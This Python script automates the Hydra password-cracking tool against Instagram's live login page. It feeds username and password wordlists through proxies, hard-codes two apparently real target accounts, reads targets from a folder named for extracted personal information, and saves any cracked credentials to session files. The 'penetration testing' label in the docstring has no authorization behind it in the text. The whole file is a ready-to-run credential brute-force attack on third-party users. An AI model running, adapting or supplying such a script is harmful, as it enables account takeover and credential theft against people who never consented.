#!/usr/bin/env python3
"""
Real Hydra Instagram Brute Force Automation Script
Executes actual hydra binary for Instagram login attacks
Part of penetration testing workflow - operational script
"""

import os
import sys
import json
import time
import random
import argparse
import subprocess
from pathlib import Path
from datetime import datetime
from typing import List, Optional, Dict, Tuple

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

# Configuration
TARGET_HOST = "www.instagram.com"
TARGET_SERVICE = "https-post-form"
LOGIN_PATH = "/accounts/login/"
USERNAME_FILE = "extracted_personal_info/target_usernames.txt"
PASSWORD_FILE = "wordlists/combined_passlist.txt"
PROXY_FILE = "proxy_list.txt"
LOG_FILE = "logs/hydra_brute_force.log"
OUTPUT_FILE = "sessions/valid_sessions.json"
SESSION_DIR = "sessions"

# Hydra specific configuration
HYDRA_THREADS = 4
HYDRA_TIMEOUT = 30
HYDRA_WAIT_TIME = 3
MAX_RETRIES = 3
DELAY_MIN = 10
DELAY_MAX = 30

console = Console()

# Ensure directories exist
Path("logs").mkdir(exist_ok=True)
Path("sessions").mkdir(exist_ok=True)
Path("extracted_personal_info").mkdir(exist_ok=True)
Path("wordlists").mkdir(exist_ok=True)


class HydraAttacker:
    """Real Hydra automation for Instagram brute force attacks"""

    def __init__(self, proxy: Optional[str] = None, verbose: bool = False):
        self.proxy = proxy
        self.verbose = verbose
        self.successful_logins = []
        self.failed_attempts = 0
        self.total_attempts = 0

    def load_file_lines(self, filename: str) -> List[str]:
        """Load lines from a file, return empty list if file doesn't exist"""
        try:
            with open(filename, "r", encoding="utf-8") as file:
                lines = [line.strip()
                         for line in file.readlines() if line.strip()]
                console.print(
                    f"[blue]Loaded {len(lines)} lines from {filename}[/blue]")
                return lines
        except FileNotFoundError:
            console.print(f"[bold red]File not found: {filename}[/bold red]")
            return []
        except Exception as e:
            console.print(
                f"[bold red]Error reading {filename}: {str(e)}[/bold red]")
            return []

    def log_event(self, message: str, level: str = "INFO"):
        """Log events to file with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"

        try:
            with open(LOG_FILE, "a", encoding="utf-8") as log_file:
                log_file.write(log_entry)
        except Exception as e:
            console.print(f"[yellow]Failed to write log: {str(e)}[/yellow]")

        if self.verbose:
            console.print(f"[dim]{log_entry.strip()}[/dim]")

    def save_successful_login(self, username: str, password: str, hydra_output: str):
        """Save successful login to JSON file"""
        session_data = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "password": password,
            "target": TARGET_HOST,
            "method": "hydra",
            "hydra_output": hydra_output,
            "proxy_used": self.proxy
        }

        # Save to main output file
        try:
            with open(OUTPUT_FILE, "a", encoding="utf-8") as output_file:
                json.dump(session_data, output_file, indent=2)
                output_file.write("\n")
        except Exception as e:
            console.print(f"[red]Failed to save session data: {str(e)}[/red]")

        # Save individual session file
        session_filename = f"{SESSION_DIR}/{username}_{int(time.time())}.json"
        try:
            with open(session_filename, "w", encoding="utf-8") as session_file:
                json.dump(session_data, session_file, indent=2)
        except Exception as e:
            console.print(
                f"[red]Failed to save individual session: {str(e)}[/red]")

        self.successful_logins.append(session_data)
        self.log_event(f"SUCCESSFUL LOGIN: {username}:{password}", "SUCCESS")

    def parse_hydra_output(self, output: str) -> List[Tuple[str, str]]:
        """Parse Hydra output to extract successful login credentials"""
        successful_logins = []
        lines = output.split('\n')

        for line in lines:
            # Look for successful login patterns in Hydra output
            if '[443][http-post-form]' in line and 'login:' in line and 'password:' in line:
                try:
                    # Parse line like: [443][http-post-form] host: www.instagram.com   login: username   password: password
                    parts = line.split()
                    username = ""
                    password = ""

                    for i, part in enumerate(parts):
                        if part == "login:" and i + 1 < len(parts):
                            username = parts[i + 1]
                        elif part == "password:" and i + 1 < len(parts):
                            password = parts[i + 1]

                    if username and password:
                        successful_logins.append((username, password))

                except Exception as e:
                    self.log_event(
                        f"Failed to parse Hydra output line: {line} - {str(e)}", "ERROR")

        return successful_logins

    def execute_hydra(self, usernames: List[str], passwords_file: str) -> Tuple[bool, str]:
        """Execute actual Hydra command"""

        # Build Hydra command
        cmd = [
            "hydra",
            "-L", USERNAME_FILE,  # Username list file
            "-P", passwords_file,  # Password list file
            "-t", str(HYDRA_THREADS),  # Number of threads
            "-w", str(HYDRA_WAIT_TIME),  # Wait time between connections
            "-o", f"{LOG_FILE}.hydra",  # Hydra output file
            "-f",  # Exit after first successful login per host
            "-V",  # Verbose output
            TARGET_HOST,
            TARGET_SERVICE,
            f"{LOGIN_PATH}:username=^USER^&password=^PASS^:Please wait a few minutes before trying again"
        ]

        # Add proxy if specified
        env = os.environ.copy()
        if self.proxy:
            if self.proxy.startswith("http://") or self.proxy.startswith("https://"):
                env["http_proxy"] = self.proxy
                env["https_proxy"] = self.proxy
            elif self.proxy.startswith("socks"):
                env["HYDRA_PROXY"] = self.proxy

        self.log_event(f"Executing Hydra command: {' '.join(cmd)}")

        try:
            # Execute Hydra
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                env=env,
                universal_newlines=True,
                bufsize=1
            )

            output_lines = []

            # Real-time output processing
            for line in iter(process.stdout.readline, ''):
                if line:
                    output_lines.append(line.strip())
                    if self.verbose:
                        console.print(f"[dim]HYDRA: {line.strip()}[/dim]")

                    # Check for successful login in real-time
                    if 'login:' in line and 'password:' in line:
                        console.print(
                            f"[bold green]SUCCESS: {line.strip()}[/bold green]")

            process.wait(timeout=HYDRA_TIMEOUT * 60)  # Convert to seconds
            full_output = '\n'.join(output_lines)

            # Log full output
            self.log_event(
                f"Hydra completed with return code: {process.returncode}")
            self.log_event(f"Hydra output:\n{full_output}")

            return process.returncode == 0, full_output

        except subprocess.TimeoutExpired:
            process.kill()
            self.log_event("Hydra process timed out", "ERROR")
            return False, "Hydra process timed out"

        except FileNotFoundError:
            error_msg = "Hydra binary not found. Please install Hydra first."
            self.log_event(error_msg, "ERROR")
            console.print(f"[bold red]{error_msg}[/bold red]")
            return False, error_msg

        except Exception as e:
            error_msg = f"Error executing Hydra: {str(e)}"
            self.log_event(error_msg, "ERROR")
            return False, error_msg

    def run_attack(self, max_attempts: int = None) -> Dict:
        """Run the complete brute force attack"""

        console.print(Panel.fit(
            "[bold cyan]Real Hydra Instagram Brute Force Attack[/bold cyan]\n"
            f"Target: {TARGET_HOST}\n"
            f"Proxy: {self.proxy or 'Direct connection'}\n"
            f"Threads: {HYDRA_THREADS}",
            title="Attack Configuration"
        ))

        # Load target files
        usernames = self.load_file_lines(USERNAME_FILE)
        if not usernames:
            console.print(
                "[red]No usernames found. Creating sample file...[/red]")
            # Create sample username file
            with open(USERNAME_FILE, "w") as f:
                f.write("alx.trading\nwhatilove1728\n")
            usernames = ["alx.trading", "whatilove1728"]

        if not os.path.exists(PASSWORD_FILE):
            console.print(
                f"[red]Password file not found: {PASSWORD_FILE}[/red]")
            return {"success": False, "error": "Password file not found"}

        # Load proxies if available
        proxies = self.load_file_lines(
            PROXY_FILE) if os.path.exists(PROXY_FILE) else []

        console.print(f"[blue]Usernames: {len(usernames)}[/blue]")
        console.print(f"[blue]Password file: {PASSWORD_FILE}[/blue]")
        console.print(f"[blue]Proxies available: {len(proxies)}[/blue]")

        results = {
            "start_time": datetime.now().isoformat(),
            "target": TARGET_HOST,
            "usernames_tested": usernames,
            "successful_logins": [],
            "failed_attempts": 0,
            "total_attempts": 0,
            "proxy_used": self.proxy
        }

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:

            task = progress.add_task("Running Hydra attack...", total=1)

            # Execute Hydra attack
            success, output = self.execute_hydra(usernames, PASSWORD_FILE)

            # Parse results
            if success and output:
                successful_logins = self.parse_hydra_output(output)

                for username, password in successful_logins:
                    self.save_successful_login(username, password, output)
                    console.print(
                        f"[bold green]✅ CRACKED: {username}:{password}[/bold green]")

                results["successful_logins"] = [
                    {"username": u, "password": p} for u, p in successful_logins
                ]

            progress.update(task, completed=1)

        results["end_time"] = datetime.now().isoformat()
        results["total_successful"] = len(self.successful_logins)

        # Display results
        self.display_results(results)

        return results

    def display_results(self, results: Dict):
        """Display attack results in a formatted table"""

        table = Table(title="Hydra Attack Results")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")

        table.add_row("Target", results["target"])
        table.add_row("Start Time", results["start_time"])
        table.add_row("End Time", results.get("end_time", "N/A"))
        table.add_row("Successful Logins", str(results["total_successful"]))
        table.add_row("Usernames Tested", str(
            len(results["usernames_tested"])))
        table.add_row("Proxy Used", str(results["proxy_used"] or "Direct"))

        console.print(table)

        if results["successful_logins"]:
            console.print("\n[bold green]Successful Credentials:[/bold green]")
            for login in results["successful_logins"]:
                console.print(
                    f"[green]  {login['username']}:{login['password']}[/green]")

        console.print(f"\n[blue]Full results saved to: {OUTPUT_FILE}[/blue]")
        console.print(f"[blue]Logs saved to: {LOG_FILE}[/blue]")


def main():
    """Main execution function"""
    parser = argparse.ArgumentParser(
        description="Real Hydra Instagram Brute Force Automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python real_hydra_brute_force.py --verbose
  python real_hydra_brute_force.py --proxy http://127.0.0.1:8080
  python real_hydra_brute_force.py --proxy socks5://127.0.0.1:1080 --verbose
        """
    )

    parser.add_argument(
        "--proxy",
        help="Proxy to use (http://host:port or socks5://host:port)"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output"
    )
    parser.add_argument(
        "--max-attempts",
        type=int,
        help="Maximum number of attempts per username"
    )

    args = parser.parse_args()

    # Check if running as root (recommended for some network operations)
    if os.geteuid() != 0:
        console.print(
            "[yellow]Warning: Not running as root. Some network operations may be limited.[/yellow]")

    # Initialize attacker
    attacker = HydraAttacker(proxy=args.proxy, verbose=args.verbose)

    try:
        # Run the attack
        results = attacker.run_attack(max_attempts=args.max_attempts)

        if results["total_successful"] > 0:
            console.print(
                f"\n[bold green]🎉 Attack completed with {results['total_successful']} successful login(s)![/bold green]")
            sys.exit(0)
        else:
            console.print(
                "\n[yellow]Attack completed but no successful logins found.[/yellow]")
            sys.exit(1)

    except KeyboardInterrupt:
        console.print("\n[red]Attack interrupted by user.[/red]")
        sys.exit(130)
    except Exception as e:
        console.print(f"\n[bold red]Fatal error: {str(e)}[/bold red]")
        sys.exit(1)


if __name__ == "__main__":
    main()
